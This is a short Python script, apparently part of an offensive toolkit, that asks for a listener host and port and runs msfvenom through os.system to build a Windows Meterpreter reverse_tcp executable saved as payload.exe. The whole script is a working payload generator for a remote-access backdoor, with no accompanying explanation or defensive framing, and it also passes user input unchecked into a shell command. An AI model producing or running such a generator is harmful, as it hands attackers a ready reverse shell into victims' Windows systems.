import os
from colorama import Fore

def run():
    lhost = input("\n[+] LHOST: ").strip()
    lport = input("[+] LPORT: ").strip()
    payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > payload.exe"
    
    os.system(payload)
    print(Fore.GREEN + "[+] Payload generated: payload.exe")